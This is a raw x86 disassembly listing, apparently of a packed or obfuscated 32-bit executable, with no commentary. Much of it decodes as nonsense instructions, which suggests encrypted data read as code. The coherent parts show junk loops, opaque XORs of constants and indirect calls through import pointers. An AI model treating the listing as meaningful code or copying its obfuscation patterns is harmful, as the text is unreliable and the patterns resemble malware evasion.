  40b8c2:	jecxz  0x40b8fb
  40b8c4:	cmp    al,0x1b
  40b8c6:	sbb    DWORD PTR [edi],esp
  40b8c8:	cmp    esi,0xc224bec2
  40b8ce:	int3   
  40b8cf:	call   FWORD PTR [ebp+ebx*8+0x1a]
  40b8d3:	dec    ecx
  40b8d4:	jns    0x40b920
  40b8d6:	(bad)  
  40b8d7:	jnp    0x40b878
  40b8d9:	daa    
  40b8da:	xchg   edi,eax
  40b8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8dc:	sti    
  40b8dd:	add    DWORD PTR [ebx-0x80],0xffffffbd
  40b8e1:	clc    
  40b8e2:	sar    BYTE PTR [ebx+0x58],cl
  40b8e5:	cmc    
  40b8e6:	pusha  
  40b8e7:	inc    ecx
  40b8e8:	jecxz  0x40b95b
  40b8ea:	and    al,0xa8
  40b8ec:	cld    
  40b8ed:	gs repz cwde 
  40b8f0:	dec    edi
  40b8f1:	test   BYTE PTR [edx+edx*2-0x59ac1c5a],ch
  40b8f8:	mov    ah,0x4b
  40b8fa:	mov    DWORD PTR [ebp-0x14],esi
  40b8fd:	sbb    ecx,DWORD PTR ds:0x4305c6
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430516
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43051e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x430526,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42eea8,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42eeac,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42eea0,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	xor    BYTE PTR [ebx+0x3ec99d6f],0xf8
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b961
  40b96d:	repnz add ebx,DWORD PTR [ecx]
  40b970:	cdq    
  40b971:	inc    edx
  40b972:	call   FWORD PTR [ecx+0x7cddc1fe]
  40b978:	add    eax,0x652c91ee
  40b97d:	jmp    0x40b97a
  40b97f:	add    edi,DWORD PTR [ebp+0x6a487c0d]
  40b985:	inc    esp
  40b986:	adc    BYTE PTR [ebp+0xcc945c],0x90
  40b98d:	pusha  
  40b98e:	cmp    dl,ah
  40b990:	dec    ebx
  40b991:	adc    DWORD PTR [eax],ecx
  40b993:	sub    eax,0x21c8131a
  40b998:	fbld   TBYTE PTR [ebx+edx*1-0x2dcc02af]
  40b99f:	cmp    al,0xac
  40b9a1:	pop    esp
  40b9a2:	jnp    0x40b992
  40b9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9a5:	jae    0x40b988
  40b9a7:	inc    ecx
  40b9a8:	push   ss
  40b9a9:	cmp    edx,DWORD PTR [ebp-0x20]
  40b9ac:	and    BYTE PTR [esi-0x1b41113],ah
  40b9b2:	adc    al,0x39
  40b9b4:	pop    ecx
  40b9b5:	minps  xmm3,XMMWORD PTR [ebx-0x157704a]
  40b9bc:	pusha  
  40b9bd:	mov    al,BYTE PTR [eax]
  40b9bf:	repnz dec edi
  40b9c1:	dec    eax
  40b9c2:	addr16 repz lahf 
  40b9c5:	outs   dx,BYTE PTR ds:[esi]
  40b9c6:	ret    
  40b9c7:	inc    ecx
  40b9c8:	mov    dl,0xfe
  40b9ca:	fs inc ebx
  40b9cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9cd:	retf   0xc650
  40b9d0:	xchg   esp,eax
  40b9d1:	sar    BYTE PTR [esi+ebp*1],1
  40b9d4:	sbb    eax,0x25f5001e
  40b9d9:	jg     0x40b9ff
  40b9db:	out    0x30,eax
  40b9dd:	push   esp
  40b9de:	in     al,0x1a
  40b9e0:	xlat   BYTE PTR ds:[ebx]
  40b9e1:	sar    DWORD PTR [edi],1
  40b9e3:	shl    DWORD PTR [ecx-0x22],cl
  40b9e6:	jg     0x40b972
  40b9e8:	add    DWORD PTR [di+0x70],edi
  40b9ec:	sahf   
  40b9ed:	mov    bl,0x8f
  40b9ef:	lds    ecx,FWORD PTR [edi+esi*4+0x24]
  40b9f3:	fldenv [ebx]
  40b9f5:	daa    
  40b9f6:	fidiv  WORD PTR [edx]
  40b9f8:	cmp    BYTE PTR [ebx],cl
  40b9fa:	inc    ecx
  40b9fb:	(bad)  
  40b9fc:	or     esp,DWORD PTR [ebx]
  40b9fe:	jmp    0x594:0xf847641a
  40ba05:	mov    BYTE PTR [ecx],al
  40ba07:	and    ch,BYTE PTR [esi+0x24d30acb]
  40ba0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba0e:	dec    esp
  40ba0f:	iret   
  40ba10:	push   es
  40ba11:	in     al,0x39
  40ba13:	ins    DWORD PTR es:[edi],dx
  40ba14:	xchg   ecx,eax
  40ba15:	push   ebx
  40ba16:	sbb    DWORD PTR [edi+ecx*1],ebx
  40ba19:	mov    ds:0x15d96c58,eax
  40ba1e:	das    
  40ba1f:	xlat   BYTE PTR ds:[ebx]
  40ba20:	ret    0x23e
  40ba23:	add    DWORD PTR [eax],edi
  40ba25:	pop    edi
  40ba26:	mov    BYTE PTR [ecx],cl
  40ba28:	adc    BYTE PTR [esp+edx*8],0x31
  40ba2c:	int3   
  40ba2d:	test   eax,0x32f9b31c
  40ba32:	mov    eax,ds:0xa6da529c
  40ba37:	xchg   ebx,eax
  40ba38:	popf   
  40ba39:	pop    es
  40ba3a:	xchg   DWORD PTR [edi],esi
  40ba3c:	adc    edi,ecx
  40ba3e:	arpl   ax,ax
  40ba40:	mov    eax,0xf7ec36bf
  40ba45:	and    eax,0xc0f703c6
  40ba4a:	mov    edi,0xa99bb77d
  40ba4f:	xor    ah,BYTE PTR [ebx-0x6a]
  40ba52:	xchg   edi,eax
  40ba53:	fiadd  DWORD PTR [eax-0x158655d5]
  40ba59:	imul   esi,DWORD PTR [ebx+eax*2+0x6],0x325638b
  40ba61:	push   ss
  40ba62:	xchg   ebp,eax
  40ba63:	mov    eax,ds:0x7dfca0fe
  40ba68:	fstp   DWORD PTR [esi]
  40ba6a:	ss xor eax,0xe13303f6
  40ba70:	xchg   edx,eax
  40ba71:	call   0x2ca65277
  40ba76:	fwait
  40ba77:	xchg   bh,al
  40ba79:	inc    eax
  40ba7a:	mov    esp,0xc9d1d5fa
  40ba7f:	jns    0x40ba7c
  40ba81:	(bad)
  40ba85:	pop    edx
  40ba86:	pop    ebp
  40ba87:	out    dx,al
  40ba88:	adc    al,0x52
  40ba8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba8b:	adc    eax,0xfae2732f
  40ba90:	xchg   ebp,eax
  40ba91:	cdq    
  40ba92:	pusha  
  40ba93:	stos   BYTE PTR es:[edi],al
  40ba94:	mov    dh,0x58
  40ba96:	inc    edx
  40ba97:	mov    DWORD PTR [ecx+0x4d930554],edx
  40ba9d:	mov    edx,0x9efaa5ef
  40baa2:	and    bh,BYTE PTR [ebp+0x51]
  40baa5:	xor    al,0x7
  40baa7:	neg    BYTE PTR [eax-0xe]
  40baaa:	stos   BYTE PTR es:[edi],al
  40baab:	lea    ebp,[ebx]
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42eea0,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430516,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42eea8,0x42ee94
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee9c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee9c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee9c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee9c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ec54
  40bb1b:	cmp    DWORD PTR ds:0x42ee9c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x4305d6
  40bb2e:	xor    DWORD PTR ds:0x430536,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x430532,0x43051a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	mov    ebx,0xff0dd518
  40bb5b:	stc    
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bba7
  40bb63:	pop    ecx
  40bb64:	jne    0x40bb1d
  40bb66:	repnz imul esp,DWORD PTR [ebx+0x1b6a0880],0x104d6b1d
  40bb71:	sub    al,0x8f
  40bb73:	push   0x53
  40bb75:	push   edi
  40bb76:	pushf  
  40bb77:	add    bl,0x28
  40bb7a:	call   0xb42d:0x46446781
  40bb81:	mov    edx,0xba39e08
  40bb86:	and    eax,DWORD PTR ds:0xf62286f9
  40bb8c:	scas   al,BYTE PTR es:[edi]
  40bb8d:	push   edi
  40bb8e:	sbb    al,0x90
  40bb90:	inc    ax
  40bb93:	cs pusha 
  40bb95:	adc    DWORD PTR ds:0x8fe4ea89,ebx
  40bb9b:	xlat   BYTE PTR ds:[ebx]
  40bb9c:	rcr    DWORD PTR [ecx+0x3ab68c62],0xd6
  40bba3:	mov    ecx,0xb4bfdc2b
  40bba8:	mov    eax,ebx
  40bbaa:	sub    al,0xe9
  40bbac:	stos   DWORD PTR es:[edi],eax
  40bbad:	test   BYTE PTR [edx],0xc4
  40bbb0:	shr    DWORD PTR [esi+0x6fd8b21c],0x98
  40bbb7:	xor    BYTE PTR [edx+0xbf54ac0],dl
  40bbbd:	(bad)  
  40bbbe:	rcl    BYTE PTR [edi-0x6c],cl
  40bbc1:	in     al,dx
  40bbc2:	jg     0x40bb98
  40bbc4:	dec    eax
  40bbc5:	popf   
  40bbc6:	mov    al,0xed
  40bbc8:	(bad)  
  40bbca:	mov    ds,WORD PTR ds:0x1234ce2c
  40bbd0:	cwde   
  40bbd1:	push   ecx
  40bbd2:	fisttp WORD PTR [ecx]
  40bbd4:	xchg   esp,eax
  40bbd5:	cli    
  40bbd6:	scas   eax,DWORD PTR es:[edi]
  40bbd7:	mov    dl,0xa5
  40bbd9:	daa    
  40bbda:	mov    ds:0xec14ae4e,eax
  40bbdf:	inc    ebx
  40bbe0:	xchg   esp,eax
  40bbe1:	adc    ebp,ebx
  40bbe3:	push   edi
  40bbe4:	aaa    
  40bbe5:	push   es
  40bbe6:	mov    cl,0x3c
  40bbe8:	clc    
  40bbe9:	jo     0x40bc4e
  40bbeb:	shl    BYTE PTR [edi],1
  40bbed:	out    0xf4,al
  40bbef:	shr    esp,0xee
  40bbf2:	sbb    DWORD PTR [edi],esp
  40bbf4:	mov    ch,0x71
  40bbf6:	mov    dl,0x4d
  40bbf8:	popa   
  40bbf9:	push   esi
  40bbfa:	cdq    
  40bbfb:	and    eax,0xf30200ab
  40bc00:	mov    cl,0xf2
  40bc02:	jge    0x40bbca
  40bc04:	(bad)  
  40bc05:	mov    edx,0x539efa73
  40bc0a:	inc    esi
  40bc0b:	in     eax,dx
  40bc0c:	mov    cs:0x41a632ba,eax
  40bc12:	into   
  40bc13:	sar    DWORD PTR [edi],cl
  40bc15:	inc    edi
  40bc16:	clc    
  40bc17:	pop    edi
  40bc18:	cmp    DWORD PTR [ebp-0xa06bf3c],0xffffffb5
  40bc1f:	and    DWORD PTR [eax],ecx
  40bc21:	stos   DWORD PTR es:[edi],eax
  40bc22:	and    eax,0xf0d17438
  40bc27:	mov    edx,0xb6bce66b
  40bc2c:	mov    dl,0xe7
  40bc2e:	sub    cl,BYTE PTR [eax-0x30]
  40bc31:	lock push esi
  40bc33:	push   edx
  40bc34:	push   ecx
  40bc35:	sub    DWORD PTR ss:[esi+0x56ecf782],edi
  40bc3c:	adc    ebp,eax
  40bc3e:	xchg   edi,eax
  40bc3f:	and    DWORD PTR [edi+0x4b],ebx
  40bc42:	push   0xc
  40bc44:	les    esp,FWORD PTR [eax-0x5d82ecbb]
  40bc4a:	sar    BYTE PTR [edx+0x6f0b742b],cl
  40bc50:	retf   
  40bc51:	shr    ebp,1
  40bc53:	iret   
  40bc54:	xchg   ecx,eax
  40bc55:	fs ss pop ecx
  40bc58:	jmp    0x40bcac
  40bc5a:	cmp    BYTE PTR [ecx-0x584676f9],bh
  40bc60:	leave  
  40bc61:	mov    ah,0x5f
  40bc63:	jo     0x40bc67
  40bc65:	pop    ds
  40bc66:	jle    0x40bc02
  40bc68:	ret    
  40bc69:	sub    dh,BYTE PTR [esi]
  40bc6b:	jle    0x40bc64
  40bc6d:	cwde   
  40bc6e:	push   eax
  40bc6f:	call   0xdbddb4ee
  40bc74:	jbe    0x40bc0f
  40bc76:	jno    0x40bc3a
  40bc78:	sar    BYTE PTR [ebx-0x499c6e56],cl
  40bc7e:	inc    ecx
  40bc7f:	push   ecx
  40bc80:	dec    eax
  40bc81:	mov    BYTE PTR [ebp-0x45196d18],dl
  40bc87:	stos   BYTE PTR es:[edi],al
  40bc88:	inc    edx
  40bc89:	xor    BYTE PTR [eax],al
  40bc8b:	sub    bh,BYTE PTR [ecx]
  40bc8d:	fs nop
  40bc8f:	loope  0x40bc25
  40bc91:	lds    esi,FWORD PTR [ebp-0x314783c2]
  40bc97:	sub    ch,ch
  40bc99:	mov    edx,0x5bbb8048
  40bc9e:	and    DWORD PTR [eiz*1-0x3cfc6e8e],ecx
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x4305d2,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x4305ce,0x42eeb0
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x43053e,0x4305c6
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x430542,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x430542
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x430542,ecx
  40bcf2:	cmp    DWORD PTR ds:0x430542,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x430542,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x430522
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42eaac
  40bd1f:	cmp    DWORD PTR ds:0x430542,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x430542
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x430542,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e7f2,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430516
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x4305da,0x4305d2
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee90,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x430532,0x19
  40bd88:	cmp    DWORD PTR ds:0x430532,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x430532,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42eab0
  40bdad:	mov    ecx,DWORD PTR ds:0x430532
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x430532,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x4305da
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	cld    
  40bddd:	test   eax,0xfab03d20
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40bd95
  40bde9:	imul   ecx,esp,0x2f450b5
  40bdef:	fld    QWORD PTR [eax]
  40bdf1:	cmp    DWORD PTR [edx],0x20
  40bdf4:	xchg   edx,eax
  40bdf5:	push   edi
  40bdf6:	pop    ds
  40bdf7:	inc    edx
  40bdf8:	jg     0x40bdec
  40bdfa:	popa   
  40bdfb:	mov    DWORD PTR [edx],0xae09f1f7
  40be01:	sub    BYTE PTR [esi-0x528b29ee],dl
  40be07:	xor    al,0x52
  40be09:	mov    ss,WORD PTR [ecx+eax*1-0x6a]
  40be0d:	ret    0xb94c
  40be10:	or     DWORD PTR [ebx],ecx
  40be12:	je     0x40bd9d
  40be14:	mov    cl,BYTE PTR [eax]
  40be16:	xchg   ecx,eax
  40be17:	in     al,0xa8
  40be19:	loopne 0x40be82
  40be1b:	icebp  
  40be1c:	and    al,0xea
  40be1e:	shl    DWORD PTR [ebx-0x2fe0fa9d],cl
  40be24:	mov    esi,0x6c77cbb0
  40be29:	out    0xb9,eax
  40be2b:	ficom  WORD PTR [esi+ebp*4]
  40be2e:	ror    ecx,1
  40be30:	les    edi,FWORD PTR [ecx+0x63]
  40be33:	or     DWORD PTR [ebx+0x24],ebp
  40be36:	dec    esi
  40be37:	mov    ah,0x83
  40be39:	sbb    ch,bl
  40be3b:	int3   
  40be3c:	clc    
  40be3d:	pusha  
  40be3e:	(bad)  
  40be3f:	pop    ecx
  40be40:	ja     0x40be68
  40be42:	dec    esi
  40be43:	int3   
  40be44:	in     al,0x6f
  40be46:	ss jl  0x40be59
  40be49:	pop    DWORD PTR [esi]
  40be4b:	in     eax,dx
  40be4c:	sub    ah,al
  40be4e:	test   eax,0x2d18cb56
  40be53:	into   
  40be54:	test   eax,0xea554105
  40be59:	test   bh,bh
  40be5b:	push   ebp
  40be5c:	hlt    
  40be5d:	jae    0x40be3f
  40be5f:	int    0x9d
  40be61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be62:	cwde   
  40be63:	pop    ecx
  40be64:	fdivrp st(1),st
  40be66:	(bad)  
  40be67:	pop    ebp
  40be68:	loope  0x40bed8
  40be6a:	adc    al,0x84
  40be6c:	dec    edx
  40be6d:	mov    edx,0x559b6b14
  40be72:	xchg   ebp,eax
  40be73:	es push ebp
  40be75:	or     BYTE PTR [esi],dl
  40be77:	push   0x5aa822c1
  40be7c:	jae    0x40be9d
  40be7e:	loope  0x40be38
  40be80:	or     eax,0xfde0cb0
  40be85:	jl     0x40beed
  40be87:	dec    edi
  40be88:	loope  0x40bef0
  40be8a:	pusha  
  40be8b:	lock jmp 0x40be44
  40be8e:	inc    ebp
  40be8f:	add    al,0xec
  40be91:	push   ecx
  40be92:	in     al,0xe
  40be94:	neg    BYTE PTR [edx-0x5648cb16]
  40be9a:	sub    al,0x12
  40be9c:	lahf   
  40be9d:	push   ds
  40be9e:	scas   eax,DWORD PTR es:[edi]
  40be9f:	ror    al,1
  40bea1:	stc    
  40bea2:	shr    BYTE PTR [si-0x77],0x2b
  40bea7:	ds mov bl,0x78
  40beaa:	mov    bl,0x4a
  40beac:	jnp    0x40bed6
  40beae:	hlt    
  40beaf:	stos   DWORD PTR es:[edi],eax
  40beb0:	or     ah,BYTE PTR [esi]
  40beb2:	push   es
  40beb3:	mov    DWORD PTR [edi-0x3451e51e],ebx
  40beb9:	adc    bh,0xe9
  40bebc:	push   ds
  40bebd:	lds    edi,FWORD PTR [ebp*2-0x5e4b5e09]
  40bec4:	mov    fs,WORD PTR [esi]
  40bec6:	(bad)  
  40bec7:	ja     0x40be60
  40bec9:	adc    edx,DWORD PTR [ebx+ebx*4]
  40becc:	fldcw  WORD PTR [edx]
  40bece:	fbstp  TBYTE PTR [ebp-0x633f1253]
  40bed4:	xchg   esi,eax
  40bed5:	lods   al,BYTE PTR ds:[esi]
  40bed6:	xlat   BYTE PTR ds:[ebx]
  40bed7:	int    0x37
  40bed9:	dec    esi
  40beda:	inc    eax
  40bedb:	cwde   
  40bedc:	jg     0x40bf3f
  40bede:	sbb    al,0xa1
  40bee0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bee1:	es popa 
  40bee3:	(bad)
  40bee6:	mov    ah,ch
  40bee8:	xor    BYTE PTR gs:0x2eb30885,bh
  40beef:	push   0xe8a03cd4
  40bef4:	and    BYTE PTR [eax+eax*4],0x17
  40bef8:	xor    esi,DWORD PTR [edi+ecx*8]
  40befb:	mov    esp,DWORD PTR [edx-0x4f86ef98]
  40bf01:	nop
  40bf02:	sbb    BYTE PTR [eax-0x923372b],bh
  40bf08:	(bad)  
  40bf09:	mov    ch,0xa8
  40bf0b:	adc    DWORD PTR [edx],esp
  40bf0d:	stos   BYTE PTR es:[edi],al
  40bf0e:	inc    ebx
  40bf0f:	pop    ebx
  40bf10:	(bad)  
  40bf11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf12:	mov    esi,0xf4ba14da
  40bf17:	mov    ecx,0x7d57568a
  40bf1c:	inc    esp
  40bf1d:	lock jne 0x40bea4
  40bf20:	add    eax,0x6cf78d75
  40bf25:	push   esi
  40bf26:	vpsllq ymm1,ymm0,XMMWORD PTR [ebx+0x4d8bec45]
  40bf2e:	or     BYTE PTR [ecx+0x4305261d],al
  40bf34:	add    BYTE PTR [esi+ecx*1+0x59e90000],dl
  40bf3b:	add    DWORD PTR [eax],eax
  40bf3d:	add    ah,bl
  40bf3f:	(bad)  
  40bf40:	lods   eax,DWORD PTR ds:[esi]
  40bf41:	dec    edi
  40bf42:	ins    DWORD PTR es:[edi],dx
  40bf43:	jge    0x40bf41
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	jge    0x40bef9
  40bf4c:	sbb    al,0x32
  40bf4e:	jno    0x40bf4c
  40bf50:	jle    0x40bfd0
  40bf52:	aas    
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bf77
  40bf57:	scas   al,BYTE PTR es:[edi]
  40bf58:	mov    WORD PTR [ebx+0x61],?
  40bf5b:	ins    DWORD PTR es:[edi],dx
  40bf5c:	ja     0x40bfa4
  40bf5e:	cld    
  40bf5f:	rcl    ecx,1
  40bf61:	std    
  40bf62:	pop    ecx
  40bf63:	or     DWORD PTR [ebp-0x3f],eax
  40bf66:	pop    eax
  40bf67:	call   0xae95:0x4bc5ad78
  40bf6e:	lods   eax,DWORD PTR ds:[esi]
  40bf6f:	push   eax
  40bf70:	sbb    DWORD PTR [edx+0x4c],edi
  40bf73:	or     al,ah
  40bf75:	dec    ebp
  40bf76:	mul    esp
  40bf78:	xor    bl,BYTE PTR [ebx+eax*2]
  40bf7b:	and    al,0x7e
  40bf7d:	int3   
  40bf7e:	mov    bh,0x14
  40bf80:	pop    ecx
  40bf81:	xor    cl,BYTE PTR [edx+esi*2+0x9a42f1b]
  40bf88:	es jns 0x40bff1
  40bf8b:	fucomp st(6)
  40bf8d:	mov    edx,0xc50451b5
  40bf92:	fbstp  TBYTE PTR [edi-0x2a54000c]
  40bf98:	imul   ecx,DWORD PTR ds:0xd2812866,0x5559eb6f
  40bfa2:	outs   dx,DWORD PTR ds:[esi]
  40bfa3:	(bad)  [ecx]
  40bfa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfa6:	call   DWORD PTR [edx]
  40bfa8:	dec    esp
  40bfa9:	mov    ds:0x10dbd581,al
  40bfae:	pop    edx
  40bfaf:	xor    al,0xcb
  40bfb1:	lock sub bl,BYTE PTR ds:0xfdb988c4
  40bfb8:	xor    DWORD PTR [ebp+0x78],ebp
  40bfbb:	sub    esi,DWORD PTR [ecx]
  40bfbd:	and    eax,DWORD PTR [ecx+eax*8-0x3b6bdf30]
  40bfc4:	data16 mov ds:0xedae6451,al
  40bfca:	hlt    
  40bfcb:	pushf  
  40bfcc:	add    eax,0x25f9f891
  40bfd1:	cmp    BYTE PTR [ebx+0x35aaed6c],al
  40bfd7:	rcl    DWORD PTR [ecx-0x48ee19ba],0xc5
  40bfde:	std    
  40bfdf:	lds    eax,FWORD PTR gs:[edx]
  40bfe2:	test   eax,0x769452c5
  40bfe7:	out    dx,eax
  40bfe8:	mov    al,ds:0x1bf91dec
  40bfed:	sbb    BYTE PTR [edi-0x51b9e252],bh
  40bff3:	shl    BYTE PTR [eax],cl
  40bff5:	xorps  xmm4,XMMWORD PTR [ebx-0x4]
  40bff9:	sar    BYTE PTR [ebx-0xb],0x32
  40bffd:	mov    dh,0xd4
  40bfff:	jne    0x40c03b
  40c001:	jp     0x40c062
  40c003:	jae    0x40c05e
  40c005:	mov    ebp,0xaf06853e
  40c00a:	or     eax,DWORD PTR [ebx+eiz*1-0xe]
  40c00e:	add    BYTE PTR [edi+0x4ed0186e],dl
  40c014:	das    
  40c015:	or     bl,BYTE PTR [edx+edi*1-0x5ef7aa61]
  40c01c:	int    0x76
  40c01e:	(bad)
  40c021:	push   esp
  40c022:	mov    ah,0x2
  40c024:	popf   
  40c025:	cs scas al,BYTE PTR es:[edi]
  40c027:	and    dh,BYTE PTR [edi+0x253f84d1]
  40c02d:	(bad)  
  40c02e:	sar    BYTE PTR [eax],cl
  40c030:	in     al,dx
  40c031:	(bad)  
  40c032:	aas    
  40c033:	sbb    eax,0xe8ace527
  40c038:	push   esi
  40c039:	mov    esi,0x489d4756
  40c03e:	pop    edx
  40c03f:	repnz xor DWORD PTR [ebp+0x8],esi
  40c043:	js     0x40c00f
  40c045:	xchg   esp,eax
  40c046:	(bad)  
  40c047:	sbb    BYTE PTR [esi],dl
  40c049:	xchg   ecx,eax
  40c04a:	dec    edi
  40c04b:	repnz enter 0x15c4,0x0
  40c050:	fld    st(2)
  40c052:	dec    edi
  40c053:	(bad)
  40c057:	je     0x40c06b
  40c059:	leave  
  40c05a:	repnz cmp eax,DWORD PTR [edi+eiz*4-0x8e26593]
  40c062:	mov    ebx,0x5e50cf97
  40c067:	xchg   edi,eax
  40c068:	sub    edi,DWORD PTR [ebx+0x2c1bd2af]
  40c06e:	dec    eax
  40c06f:	cmp    DWORD PTR gs:[edx-0x14],esp
  40c073:	retf   
  40c074:	or     ecx,DWORD PTR [esi]
  40c076:	arpl   bx,ax
  40c078:	and    edx,DWORD PTR [esi]
  40c07a:	fld    DWORD PTR [ebp+0x3]
  40c07d:	mov    esi,0x4518f611
  40c082:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c083:	inc    ecx
  40c084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c085:	xor    DWORD PTR [ecx-0x26],esi
  40c088:	push   0xffffff8d
  40c08a:	(bad)  
  40c08b:	ficom  DWORD PTR [eax+0x541d65cc]
  40c091:	pushf  
  40c092:	cmp    DWORD PTR [edi],esi
  40c094:	pop    eax
  40c095:	xchg   ebp,eax
  40c096:	jne    0x40c09b
  40c098:	dec    eax
  40c099:	and    BYTE PTR [ecx+0x4305c2],ah
  40c09f:	or     eax,DWORD PTR ds:0x42ee8c
  40c0a5:	mov    ds:0x4305c2,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ee9c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43051e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e7e2
  40c0cb:	mov    ds:0x43051e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x430526,0x0
  40c0dd:	mov    eax,ds:0x430526
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x430526,eax
  40c0e8:	cmp    DWORD PTR ds:0x430526,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x430532
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e7f6
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e973
